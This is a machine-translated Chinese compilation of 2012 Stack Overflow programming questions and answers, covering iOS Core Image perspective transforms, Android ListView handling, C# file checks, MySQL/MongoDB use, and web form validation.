我很难在网上找到任何可以清楚地解释如何正确实现 Core Image 的 CIPerspectiveTransform 过滤器的文档。特别是，当为`inputTopLeft`、`inputTopRight`、`inputBottomRight`和设置 CIVector 值时，`inputBottomLeft`这些向量对图像有什么作用？（即，这些向量如何扭曲我的图像背后的数学原理是什么？）

目前这是我正在使用的代码。它不会崩溃，但不会显示图像：

```
CIImage *myCIImage = [[CIImage alloc] initWithImage:self.image];
CIContext *context = [CIContext contextWithOptions:nil];
CIFilter *filter = [CIFilter filterWithName:@"CIPerspectiveTransform" keysAndValues:@"inputImage", myCIImage, @"inputTopLeft", [CIVector vectorWithX:118 Y:484], @"inputTopRight", [CIVector vectorWithX:646 Y:507], @"inputBottomRight", [CIVector vectorWithX:548 Y:140], @"inputBottomLeft", [CIVector vectorWithX:155 Y:153], nil];
CIImage *outputImage = [filter outputImage];
CGImageRef cgimg = [context createCGImage:outputImage fromRect:[outputImage extent]];
UIImage *transformedImage = [UIImage imageWithCGImage:cgimg];
[self setImage:transformedImage];
CGImageRelease(cgimg); 
```

其他可能很重要的注意事项：

*   我的 UIImageView (75pts x 115 pts) 已经通过 awakeFromNib 初始化并且已经有一个与之关联的图像 (151px x 235px)。

*   上面的代码是在 UIImageView 的`- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event`函数中实现的。希望我能够根据屏幕坐标调整图像的透视，使图像看起来像在 3D 空间中移动。

*   此代码适用于 iPhone 应用程序。

同样，我想我要问的问题是各种参数向量的作用，但我可能问错了问题。

以下帖子非常相似，但询问的是为什么他的图像消失了，而不是如何使用 CIVectors 进行 CIPerspectiveTransform。它也很少受到关注，可能是因为它太笼统了： [我如何使用 CIPerspectiveTransform 过滤器](https://stackoverflow.com/questions/8635984/how-i-can-use-ciperspectivetransform-filter)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T22:16:19.523

正如我对链接问题的评论，CIPerspectiveTransform[在 iOS 5.1 的 Core Image 的 iOS 实现中不可用](https://stackoverflow.com/questions/8528726/does-ios-5-support-blur-coreimage-fiters)。这就是为什么您和其他提问者没有看到任何图像的原因，因为您的 CIFilter 很可能是 nil。

如果您只是想在图像上实现一种透视形式，那么在 iOS 上有两种不同的快速方法可以做到这一点，正如我在[这个答案](https://stackoverflow.com/a/10458680/19679)中所描述的那样。一种是在 UIImageView 的层上简单地使用[正确类型的 CATransform3D](https://stackoverflow.com/a/353611/19679)，但这仅用于显示，不适用于图像调整。

第二种方法是在 OpenGL ES 中使用适当的 3-D 变换矩阵来操作图像。正如我在上面链接的答案中指出的那样，我有[一个包含所有这些的开源框架](https://github.com/BradLarson/GPUImage)，并且那里的 FilterShowcase 示例有一个将透视图应用于传入视频的示例。您可以轻松地将视频输入与图像交换，并在应用透视效果后从中获取图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-14T17:40:09.607

Ooooold 帖子，但我敢打赌，仍然有人会寻找这种过滤器：

以下函数将过滤器应用于图像并返回具有透视的相同图像，以尝试创建具有透视的反射效果。（下图仅为示例，并非实测结果）

[![镜面效果示例](../Images/76c1de87cc673c7554eeaf37095ad931.png)](https://i.stack.imgur.com/C0rHe.png)

这是一个示例，因此您需要进行一些调整。目的是创建一个似乎反映“主要”形象的形象。

所以我在我的视图中添加了两个图像视图，如图所示。添加约束等

然后在 func 中，您将看到坐标是硬编码的，因此返回的图像将完美匹配其容器底部 UIImageView。

[![在此处输入图像描述](../Images/784f9d00e78144e11a6f66ab10e3ca5e.png)](https://i.stack.imgur.com/OZIqg.png)

```
func applyperspectiveTransform(imagen: UIImage) -> UIImage
{

      var context = CIContext()
    var outputImage = CIImage()
    var newUIImage = UIImage()

    let leftTop     = CGPoint(x: self.ImgView.frame.origin.x, y: self.ImgReflection.frame.origin.y + self.ImgReflection.frame.size.height)
    let leftBottom  = CGPoint(x: self.ImgReflection.frame.origin.x, y: self.ImgView.frame.origin.y + self.ImgView.frame.size.height)
    let rightTop    = CGPoint(x: self.ImgView.frame.origin.x + self.ImgView.frame.size.width, y: self.ImgReflection.frame.origin.y + self.ImgReflection.frame.size.height)
    let rightBottom = CGPoint(x: self.ImgReflection.frame.origin.x + self.ImgReflection.frame.size.width, y: self.ImgView.frame.origin.y + self.ImgView.frame.size.height)

    let lT = CIVector(x: leftTop.x, y: leftTop.y)
    let lB = CIVector(x: leftBottom.x, y: leftBottom.y)
    let rT = CIVector(x: rightTop.x, y: rightTop.y)
    let rB = CIVector(x: rightBottom.x, y: rightBottom.y)

    let aCIImage = CIImage(image: imagen)
    context = CIContext(options: nil);

    let perspectiveTransform = CIFilter(name: "CIPerspectiveTransform")!

    perspectiveTransform.setValue(lB,forKey: "inputTopLeft")
    perspectiveTransform.setValue(rB,forKey: "inputTopRight")
    perspectiveTransform.setValue(rT,forKey: "inputBottomRight")
    perspectiveTransform.setValue(lT,forKey: "inputBottomLeft")
    perspectiveTransform.setValue(aCIImage,forKey: kCIInputImageKey)

    outputImage = perspectiveTransform.outputImage!
    let cgimg = context.createCGImage(outputImage, from: outputImage.extent)
    newUIImage = UIImage(cgImage: cgimg!)

    return newUIImage
} 
```

对于这种特殊效果（镜像），您可能需要添加更多效果，例如渐变、更改 alpha 等

快乐编码！希望能帮助到你

希望能帮助到你！

# c - 如何构建鞋子和 ruby 1.9.3？

> ID：10676384
> 
> 赞同：1
> 
> 时间：2012-05-20T19:13:23.880
> 
> 标签：c, ruby, build, shoes

我一直在尝试使用 ruby​​ 1.9.3 构建鞋子，并在构建结束时收到以下错误：

```
main.c:(.text+0x70): undefined reference to `ruby_snprintf'
main.c:(.text+0xcb): undefined reference to `ruby_run_node'
dist/libshoes.so: undefined reference to `ruby_vsnprintf'
dist/libshoes.so: undefined reference to `rb_str_new_cstr'
dist/libshoes.so: undefined reference to `rb_intern2' 
```

这是在 Fedora 15 盒子上的。

经过多次谷歌搜索，我发现了以下评论：

“现在我记得我在哪里看到了构建 Shoes 的错误消息！那是我在没有 RVM 或 apt-get 帮助的情况下从源代码编译 Ruby（对你来说很好）。Ruby makefile 做出了 Shoes 和它的 rake 文件没有的选择喜欢。”

我尝试使用 rvn 重新安装 ruby​​ 1.9.3，但没有运气。另外，我尝试从源代码构建 ruby​​ 1.9.3，并查看 define.h 等，看看我是否可以了解如何进行构建，以便构建鞋子。也没有运气。

有谁知道如何制作鞋子？有什么方法可以配置和构建 ruby​​ 1.9.3 以便构建鞋子吗？我必须破解鞋子的源代码吗？是否有一些关于构建 ruby​​ 的文档解释了如何构建 1.9.3 以便定义上述五个引用？我注意到在构建 ruby​​ 时源文件 vsnprintf.c 没有被编译。ruby_snprintf 需要那个文件吗？如果是这样，我如何配置 ruby​​ 构建过程来编译它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T11:57:38.333

尝试安装[绿鞋](https://github.com/ashbb/green_shoes)。

您尝试安装的是原始的 Shoes，它具有一些本机 C 组件。Green Shoes 纯粹是 Ruby，没有 C 依赖项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:41:35.070

我做了一些谷歌搜索，我偶然发现了[这个](https://github.com/shoes/shoes/issues/113#issuecomment-1542590)，我希望它有帮助：

# android - 如何使用按钮..（android）在自定义列表视图中获取值

> ID：10676385
> 
> 赞同：0
> 
> 时间：2012-05-20T19:13:29.043
> 
> 标签：android, listview, button

我真的需要帮助。我有一个列表视图，列表中有按钮。我想要做的是获取按下按钮的当前列表的值..（id和名称）我有一个myClickHandler，当按下按钮时它会调用这个..

```
 public void myClickHandler(View v){
     ListView lvItems = getListView();
    String name = null ;
    for (int i=0; i<lvItems.getChildCount(); i++) 
        {
    }

        AlertDialog alertDialog = new AlertDialog.Builder(
            AllProductsActivity.this).create();
        alertDialog.setTitle("Alert Dialog");
        alertDialog.setMessage("You have selected "+ name);
        alertDialog.setButton("OK", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int which) {
            Toast.makeText(getApplicationContext(), "You clicked on OK", Toast.LENGTH_SHORT).show();
    }
            }); 
```

并将显示一些带有给定详细信息的alertDialog ..

非常感谢任何愿意帮助我的人..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:29:11.960

如果您正在从单击的按钮行中查找信息，您可以执行以下操作：

```
public void myClickHandler(View v){ 
    LinearLayout ll = v.getParent();  // v is the button, the parent should be the rowlayout, assuming LinearLayout
    TextView tv = ll.findViewById(R.id.listviewtext);  // find your textview in the LinearLayout for the row
    String ListText = tv.getText().toString();  // Get the text form the TextView

    // rest of your code
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:34:48.877

请看listview的教程： [http ://www.youtube.com/watch?v=wDBM6wVEO70](http://www.youtube.com/watch?v=wDBM6wVEO70)

然后，通过 getView 使每个视图的 onClickListener 相同，并从它们的 viewHolder 中获取值。而已。

# android - 带有 Gridview 和缩略图的 Android 图库

> ID：10676388
> 
> 赞同：0
> 
> 时间：2012-05-20T19:13:49.430
> 
> 标签：android, gridview, three20, android-gallery

对于我的应用程序，我需要一个带有远程图像的画廊（Gridview）（原始和拇指的 URL 正在由 JSON 文件解析），其中显示缩略图并在单击时加载原始大小的图像（最好是异步... ) 我已经在[http://fukyo-it.blogspot.com/2010/08/iphone-sdk-creating-photo-gallery-with.html](http://fukyo-it.blogspot.com/2010/08/iphone-sdk-creating-photo-gallery-with.html)上看到了这个，但如何在 Android 上轻松实现？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T16:16:23.440

这看起来像是满足我需求的完美库：[https ://github.com/nostra13/Android-Universal-Image-Loader](https://github.com/nostra13/Android-Universal-Image-Loader)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:27:58.793

我没有做过任何 iPhone 开发，但这在 Android 上应该不会太难。我会按照这里的教程[http://developer.android.com/resources/tutorials/views/hello-gridview.html](http://developer.android.com/resources/tutorials/views/hello-gridview.html)。我使用 Gallery 控件做了类似的事情。我遇到的主要问题是关于性能和内存的，因此请确保在后台线程上下载图像，并限制您在内存中保留的图像数量（如果它将是一大组图像）。

# c# - File.Exists - 错了吗？

> ID：10676391
> 
> 赞同：-2
> 
> 时间：2012-05-20T19:14:08.300
> 
> 标签：c#, asp.net, path

我正在尝试查看图片是否存在，但这表示不存在，并且路径是正确的！路径是正确的，并且有图片，但这总是转到“其他”。

```
string path = @"c:\folder\pic.jpg";

if (File.Exists(path))
{ 
    //Do something here 
}
else 
{
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-20T19:15:41.677

可能是权限问题。从[文档中](http://msdn.microsoft.com/en-us/library/system.io.file.exists.aspx)：

> 如果调用者没有足够的权限来读取指定的文件，则不抛出异常，并且无论路径是否存在，该方法都返回 false。

当然，这意味着您在运行 Web 应用程序（通常在降低的权限下运行）时比客户端应用程序更有可能看到此问题。

此外，如 deerchao 的评论中所述，仅当给定的路径是*文件*而不是目录`File.Exists`时才返回 true 。同样，从文档中：

 *> 如果 path 描述了一个目录，则此方法返回 false。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-20T19:16:47.200

您正在尝试使用 . 查看*文件夹*是否存在`File.Exists`。这是不正确的 - 目录将失败。

用于[`Directory.Exists`](http://msdn.microsoft.com/en-us/library/system.io.directory.exists.aspx)查找目录是否存在。

```
string path = @"c:\folder";

if (Directory.Exists(path))
{ 
    //Do something here 
}
else 
{
} 
```

另一个复杂的问题是，您的应用程序在其下运行的帐户需要具有读取路径的权限 - 如果它没有权限，即使路径存在，这仍然会失败。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-20T19:18:41.410

我假设您正在尝试检查指定目录中是否存在任何文件？在这种情况下，您可以使用：

```
string path = @"c:\folder";

if (Directory.Exists(path) &&
    Directory.GetFiles(path).Any())
{
    //Do something here 
}
else
{
} 
```

在 .NET 4 及更高版本中，您可以通过将`GetFiles`调用替换为`EnumerateFiles`.*

# mysql - 一起使用 MySQL 和 Mongodb

> ID：10676397
> 
> 赞同：26
> 
> 时间：2012-05-20T19:15:02.880
> 
> 标签：mysql, mongodb, unison

我使用 MySQL 的次数超过了 MongoDB，但是从我从 MongoDB 中学到的东西，这正是我所需要的，但它也有 MySQL 可以做的限制（例如自动增量）

将 MongoDB 用于所有事情并仅将 MySQL 用于某些事情是否明智？

例如，使用 MongoDB 来存储用户和其他所有内容，但使用 MySQL 来制作票务系统。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-20T19:18:51.093

在一个项目中使用两种数据库技术听起来非常合理。只要确保您使用正确的工具来完成这项工作。

通常使用 MySQL 作为主存储，使用 MongoDB 作为缓存/中间存储以提高速度。

例如，您可以在 MongoDB 中拥有读取密集型数据。用于生成报告的数据非常适合 MySQL 等关系系统。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-20T21:32:21.203

[在 MongoDB 主站点](https://www.mongodb.com/use-cases)上有一个很好的关于 MongoDB 用例的讨论。一般而言，如果您的业务案例包括对事务和繁重的 T-SQL 功能的需求，那么使用诸如 MySQL 之类的 RDBMS 会更好。

MongoDB 的良好用例如下：

1.  您的数据是文档格式，即单个文档中的不规则结构（即数据不需要连接）
2.  您正在考虑使用平面文件系统（同样是由于您的数据结构），但您希望在索引/查询该数据的能力方面“更多”。
3.  您的项目处于一种您真的不知道您的数据最终会是什么模式或结构的状态。
4.  您有专门的数据类型，例如地理空间数据，并且您希望能够对其进行查询。
5.  您可能需要快速且廉价地扩展您的数据存储位置。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-01-03T23:48:29.943

这是一个参加过 mongoDb 课程的人对 mongodb 使用的详细讨论

[选择或不选择 MongoDB 的注意事项](http://ilya40umov.wordpress.com/2013/03/05/considerations-for-choosing-or-not-choosing-mongodb/)

博主主要说 mongodb 与其他数据库系统一起使用非常好，但是在系统范围内使用它可能是最具挑战性的，在某些特定场景下几乎是不可能的。

这里有一些字幕：

> 选择蒙哥的理由

*   面向文档和无模式
*   水平可扩展性和高可用性
*   即发即弃模式下的快速写入
*   全面的查询和聚合框架
*   比较直观的架构

> 不选择 Mongo 的理由

*   没有 SQL = 没有连接
*   没有 ACID 事务
*   您的索引不适合内存

# java - 对于基于 Java 客户端的客户端/服务器设置，在后端使用的最佳架构是什么？

> ID：10676408
> 
> 赞同：-1
> 
> 时间：2012-05-20T19:16:39.690
> 
> 标签：java, php, sql, database, nosql

我对编程还很陌生，最近几个月一直在关注 Java。我想编写一个带有 Java 小程序前端的应用程序，它将捕获有关我的用户的信息，并允许他们为体育赛事组织起来。这似乎非常适合面向对象的方法（例如，每个用户都是一个对象，每个事件都是一个对象，每个教练都是一个对象，等等）。

但是，我的用户都需要访问和更改作为对象存储的数据。似乎需要某种类型的数据库，但我只有 RDBMS 方面的经验，我看不出它如何映射到基于对象的前端。我可以只使用 PHP 驱动的 HTTP 调用，但这意味着将对象转换为表，这感觉就像是从纯粹的 OO 方法中走出来——我真的很努力不陷入程序性思维方式，这更像是我的背景。

我隐约知道 JSON 和 NOSQL 数据库，但不足以知道它们是否能解决我的问题。因此，考虑到所有这些，我真的很感谢任何关于保持 OO 的最佳方式的观点，同时拥有允许共享访问应用程序数据的客户端/服务器模型。我确信有一个简单的解决方案 - 我只是在努力寻找它！

任何提示/想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:27:17.563

首先明确您的要求，然后尝试确定哪些技术适合您的需求。您可以查看每个数据存储（MySQL、PostgreSQL 等）的功能，看看哪一个符合您的要求。接下来查看[JDBC](http://docs.oracle.com/javase/tutorial/jdbc/basics/)以查询/操作数据库中的数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:03:06.933

首先，您似乎认为 OO 和 RDBMS 不能很好地匹配。如果您正确设置架构，它们可能是一个很好的匹配。这里的信息非常少，但通常单个 java 类到单个 db-table 可能是一个好的开始。那是从 Java 到 RDBMS 的部分。

从您的应用程序服务器到客户端的通信与这部分无关（我说是因为您似乎暗示它有？）

话虽如此，NOSQL 可以成为减少限制模式的好方法，并且（您就在这里）通常更直观地映射到对象，就像您在 oo 世界中设想的那样。至于建议，我正在使用 MongoDB，它很棒.. 在这一点上，JSON 作为与 MongoDB 通信的数据格式即将到来。

如果您刚开始，所有这些技术可能会让人不知所措，所以与其建议您选择 A 或 B，不如查看一些从持久性实现中抽象出来的好的 Java Web 框架，以便您以后可以将它们换掉没有太多问题？（比如 MongoDB 的 Mysql 等）

我强烈推荐 Play Framework (http://www.playframework.org/)，它可以让您快速直观地进行操作。跟着这些例子（他们一步一步地写博客，包括持久性等），你就会很好地了解这些概念。

也许稍后您可以查看插件以使用 MongoDb 而不是 Pplay 附带的默认 RDBMS 之一，看看您喜欢什么。

Hth，吉尔特-扬

# android - 如何禁用原生安卓应用

> ID：10676410
> 
> 赞同：2
> 
> 时间：2012-05-20T19:16:47.083
> 
> 标签：android

我想从我的平板电脑中禁用或卸载或删除所有原生安卓应用程序。我只希望我的应用程序在平板电脑上运行，以便最终用户能够连接到互联网或浏览。我的应用程序自动连接到互联网一段时间后，做必要的事。

**简而言之，我想在我的平板电脑中自定义 Android 2.3.3，以便平板电脑中除了我的自定义应用程序之外没有其他应用程序。**

一旦最终用户打开平板电脑，我希望我的应用程序启动。你所能做的就是玩我的应用程序或什么都不做；）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:32:22.350

你可能需要在你的设备上创建一个自定义版本的 Android 并卸载所有应用程序，但你的应用程序可能会有所帮助： http: [//forum.xda-developers.com/showthread.php?t=633246](http://forum.xda-developers.com/showthread.php?t=633246)

如果您经验丰富，那么最好直接使用 Android 操作系统的源代码，您可以在这里找到它：http: [//source.android.com/source/index.html](http://source.android.com/source/index.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T22:06:59.103

您可以将您的应用注册为自定义启动器。此应用程序会在启动设备后以及用户点击主页按钮时出现。

您可以使用特殊的意图过滤器来做到这一点：

```
<intent-filter>
 <action android:name="android.intent.action.MAIN" />
 <category android:name="android.intent.category.HOME" />
 <category android:name="android.intent.category.DEFAULT" />
</intent-filter> 
```

# php - 模态对话框 jquery 规则

> ID：10676411
> 
> 赞同：2
> 
> 时间：2012-05-20T19:16:50.750
> 
> 标签：php, javascript, jquery, jquery-ui, modal-dialog

亲爱的大家

我是 PHP、jQuery 和英语不好的新手。

我想从数据库中询问有关 jQuery 模态对话规则的信息。这是我的数据库：

[数据库图片](http://i1230.photobucket.com/albums/ee498/aboxloserkidz/db.jpg)

这是我的代码：Javascript rules and jQuery Validate without the load of the database：

```
rules: {
  user: {
    required: true,
    number: true,
    range: [1, 8]
  }                        
},
messages: {
user: {
required: "* sorry field user empty.",
number: "* Field user must number.",
    range: "* Field user must between 1 to 8"
}                     
} 
```

我使用了 PHP，这是我的表单字段，仅来自用户。

```
<?php $user = array(
          'name'           => 'user',
          'id'             => 'user',
          'class'          => 'user',
          'value'          => '',
          'style'          => 'border: groove 2px;',
          'size'           => '3',
          'maxlength'      => '3'
          ); ?>
          <td> <?php echo form_label('User');?> </td>
        <td> : </td>
        <td> <?php echo form_input($user); ?></td> 
```

问题是如何在加载数据库时输入规则。

例如：

如果我使用 userdata 登录并加载数据库，则`$items`值为`8`.

```
echo $this->session->userdata('items') 
```

范围规则是否自动在 1 到 8 之间？如下图：

[我的模态对话框](http://i1230.photobucket.com/albums/ee498/aboxloserkidz/bertanya.jpg)

并且，如果加载数据库`$items`值的登录用户数据是`6`，范围规则是否自动介于`1`to之间`6`？同样的问题 if `$items`is `4`。

我需要你的帮助。

非常感谢您的关注。

此致，

法会

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:00:09.190

我不确定 form_input() 的作用，但您可以尝试将变量添加到输入并在附加验证规则时提取它

```
$user = array(
      'name'           => 'user',
      'id'             => 'user',
      'class'          => 'user',
      'value'          => '',
      'style'          => 'border: groove 2px;',
      'size'           => '3',
      'maxlength'      => '3',
      'data-range'     => $this->session->userdata('items')
      ); 
```

在javascript代码中

```
rules: {
  user: {
      required: true,
      number: true,
      range: [1, parseInt($('#user').data('range'))]
}... 
```

如果数据不会添加到生成的输入字段中，您可以尝试将其添加到类中，例如

```
 'class'          => 'user range_'.$this->session->userdata('items'), 
```

并在 js 中更改

```
parseInt($('#user').attr('class')) 
```

至

```
parseInt($('#user').attr('class').substring($('#user').attr('class').indexOf('range_')+6));   //add 6 as this is the length of range_ 
```

# asp.net-mvc-3 - mvc3 中的验证错误消息

> ID：10676412
> 
> 赞同：1
> 
> 时间：2012-05-20T19:17:02.880
> 
> 标签：asp.net-mvc-3

我想为文本框显示不同的错误消息，我只使用视图并且我不想使用模型进行验证：

```
@Html.TextBox("txtFirst", "", htmlAttributes: new { @class = "required email" }) 
```

此字段是必需的，并且必须是有效的电子邮件。以上解决了我的问题，但我无法显示不同的验证消息。如果用户未输入值，则错误消息是请输入电子邮件地址。如果电子邮件地址无效，则应显示请输入有效电子邮件。请记住，我不想使用模型进行验证。我只想使用视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T22:05:35.033

基本上，通过绕过 MVC 模式，如果不使用 javascript，您将无法获得所需的内容。这会奏效。

将其放在您的输入旁边或下方以显示错误

```
@Html.Label("lblError", "")

<input type="submit" id="submitButton" value="Save Data" />

//Search By Entity Info
submitButton.onclick = function (event) {

    if(isNotEmpty(firstName)) {}; // for multiple fields, put them all into a separate call and return true only if they all are OK
    else {
        return false;
    }
}

//Validation Methods
function isNotEmpty(field) {
    var fieldData = field.value;
    if (fieldData == null || fieldData.length == 0 || fieldData == "") {
        field.className = "FieldError"; // this class "FieldError" would need to use styling CSS to give the field the look that it was in error
        var errorMessage = document.getElementById("lblError");
        errorMessage.Value = "Error - Your custom text here";
        return false;
    } 
} 
```

这只是一个例子，需要调整

但我强烈建议使用 ViewModels。您还不如直接使用 HTML 而不是 MVC 3 框架。如果不按照应有的方式使用 MVC，您对自己造成了伤害。

看看我必须写的代码量！ViewModel 提供客户端和服务器端验证。所以你不会因为你只依赖客户端而被烧毁，有人要么通过发送无效数据，要么通过直接通过 URL 发布数据并将不良数据推送到数据库中绕过它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T22:16:08.640

为什么不想使用数据注释？

仅依赖客户端验证并不是一个好主意，因为用户可能在其浏览器中禁用了 javascript，而在 HTML5 表单验证的情况下使用的是旧版浏览器。这只会导致用户提交无效的表单数据。您应该始终使用客户端/服务器端验证的组合。

我强烈建议您创建一个视图模型并启用数据注释。例如请注意，出于验证目的使用 required 属性和自定义电子邮件属性：

```
[Required(ErrorMessage = "Please enter email address"]
[Email(ErrorMessage = "Please enter valid email")]
public string Email { get; set; } 
```

电子邮件验证属性示例：

```
public class EmailAttribute : RegularExpressionAttribute
{
    private const string EmailReg = @"^(?("")("".+?""@)|(([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)(?<=[0-9a-zA-Z])@))(?(\[)(\[(\d{1,3}\.){3}\d{1,3}\])|(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,6}))$";

    public EmailAttribute() : base(EmailReg)
    {
    }
} 
```

现在，根据您的问题，如果您只想使用客户端验证，那么您绝对不应该依赖 HTML5 表单验证。启用验证的一种快速方法是获取[jquery 验证插件](http://bassistance.de/jquery-plugins/jquery-plugin-validation/)。

演示在这里：http: [//jquery.bassistance.de/validate/demo/](http://jquery.bassistance.de/validate/demo/)

# javascript - document.exec 命令

> ID：10676414
> 
> 赞同：0
> 
> 时间：2012-05-20T19:17:14.323
> 
> 标签：javascript, text, range, edit

如何创建自己的 document.execCommand？因此，例如，我想创建文本居中（execCommand 仅支持 justifyCenter、justifyLeft、justifyRight），或者如果我想为图像创建对齐。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:37:25.903

您不能创建自己的`document.execCommand`，但可以使用[Rangy](http://code.google.com/p/rangy/wiki/RangyRange)修改文本选择。

例如，如果你想居中文本，试试这个：http:
[//jsfiddle.net/DerekL/h9Ym2/](http://jsfiddle.net/DerekL/h9Ym2/)

[在此处](http://rangy.googlecode.com/svn/trunk/demos/)查看更多演示。

# android - ListView 中的 setOnLongClickListener，适用于 2 行而不是 1 行

> ID：10676416
> 
> 赞同：0
> 
> 时间：2012-05-20T19:17:28.923
> 
> 标签：android, listview, button

我试图在我的 listView 行上注册一个长按，这样它就会显示一个不可见的按钮。问题是当我长按该行时，该按钮正确显示，但仅出现在 2 个不同的行中。一世

您能否查看我的代码并告诉我为什么它将我的按钮设置为 2 行可见，而不仅仅是我单击的那个？

这是我的适配器类：

```
package android.GUI;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Typeface;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnLongClickListener;
import android.view.ViewGroup;
import android.view.ViewGroup.LayoutParams;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.CursorAdapter;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.AdapterView.OnItemClickListener;

// This is a custom adapter that will use cursor to get data from SQLite DB as the source.

public class FastScrollAdapter extends CursorAdapter {

    private LayoutInflater mInflater;
    private Cursor cursor;

    public FastScrollAdapter(Context context, Cursor c) {
        super(context, c);
        this.mInflater = LayoutInflater.from(context);
        this.cursor = c;

    }

    public FastScrollAdapter(Context context, Cursor c, boolean autoRequery) {
        super(context, c, autoRequery);
        this.mInflater = LayoutInflater.from(context);
        this.cursor = c;
    }

    // Here we shall look to see if the View already exists and create a new one
    // if not.

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        final ViewHolder holder;

        // If view doesn't exists = create a new one and also store it (all of
        // the views) in our ViewHolder class called "holder"
        if (convertView == null) {

            convertView = this.mInflater.inflate(R.layout.list_entry, null);

            holder = new ViewHolder();

            holder.LL = (LinearLayout) convertView.findViewById(R.id.layoutBG);
            holder.delete = (Button) convertView.findViewById(R.id.deleteItem);
            holder.LL.setOnLongClickListener(new OnLongClickListener() {

                @Override
                public boolean onLongClick(View v) {
                    // TODO Auto-generated method stub
                    holder.delete.setVisibility(View.VISIBLE);
                    return false;
                }
            });

            holder.rowID = (TextView) convertView.findViewById(R.id.rawId);
            holder.info = (TextView) convertView.findViewById(R.id.Info);
            holder.info.setTypeface(Entry.roboto);
            holder.info.setText("Info");
            holder.dateDisp = (TextView) convertView
                    .findViewById(R.id.dateDisp);
            holder.day = (TextView) convertView.findViewById(R.id.day);
            holder.finish = (TextView) convertView.findViewById(R.id.finish);
            holder.hourMin = (TextView) convertView.findViewById(R.id.hourMin);
            holder.shiftDisp = (TextView) convertView
                    .findViewById(R.id.shiftDisp);
            holder.start = (TextView) convertView.findViewById(R.id.start);
            holder.timestarted = (TextView) convertView
                    .findViewById(R.id.timestarted);

            convertView.setTag(holder);

            // If exists, just fetch this view and display it.
        } else {
            holder = (ViewHolder) convertView.getTag();

        }
        this.cursor.moveToPosition(position);

        // Set some values...
        /*************** Taken From DB ******************/
        holder.start.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_START)));
        holder.start.setTypeface(Shifts.roboto);

        holder.shiftDisp.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_HOURS)));
        holder.shiftDisp.setTypeface(Shifts.roboto);

        holder.rowID.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_ROWID)));
        holder.rowID.setTypeface(Shifts.roboto);

        holder.dateDisp.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_DATE)));
        holder.dateDisp.setTypeface(Shifts.roboto);

        holder.day.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_DAY)));
        holder.day.setTypeface(Shifts.roboto);

        holder.finish.setText(this.cursor.getString(this.cursor
                .getColumnIndex(DBAdapter.KEY_END)));
        holder.finish.setTypeface(Shifts.roboto);

        /*************** Regular ones ******************/

        holder.info.setTypeface(Shifts.roboto);
        holder.info.setText("Info:");

        holder.hourMin.setTypeface(Shifts.roboto);
        holder.hourMin.setText("Shift:");

        holder.timestarted.setTypeface(Shifts.roboto);
        holder.timestarted.setText("Duration:");

        return convertView;
    }

    @Override
    public void bindView(View view, Context context, Cursor cursor) {
    }

    @Override
    public View newView(Context context, Cursor cursor, ViewGroup parent) {

        return null;
    }

    static class ViewHolder {

        TextView rowID;
        TextView info;
        TextView dateDisp;
        TextView day;
        TextView timestarted;
        TextView start;
        TextView finish;
        TextView hourMin;
        TextView shiftDisp;
        Button delete;
        LinearLayout LL;

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T23:00:14.447

问题是由于视图回收。要维护按钮视图的状态，您需要维护其状态的单独数组。我这样做：

在您的适配器中添加一个数组：

```
public static int[] buttonState; 
```

在您的构造函数中添加一个方法：

```
populateButtonState(); 
```

方法（0 表示不可见，1 表示可见）：

```
public static void populateButtonState() {
    buttonState = new int[c.getCount()];
    int i = 0;
    while (c.isAfterLast() == false) {
        buttonState[i] = 0;
        i++;
        c.moveToNext();
    }
} 
```

然后在您的 getView 中，根据数组设置可见性：

```
holder.delete = (Button) convertView.findViewById(R.id.deleteItem);           
if(buttonState[position] = 1) holder.delete.setVisibility(View.VISIBLE); 
```

您还需要添加到您的`onLongClick`（假设您要`onLongClick`切换状态）：

```
if(buttonState[position] = 1) {
    holder.delete.setVisibility(View.INVISIBLE);
    buttonState[position] = 0;
} else {
    holder.delete.setVisibility(View.VISIBLE);
    buttonState[position] = 1;
} 
```

# ruby - 使用 Ruby 如何避免在文件中写入额外的行

> ID：10676421
> 
> 赞同：2
> 
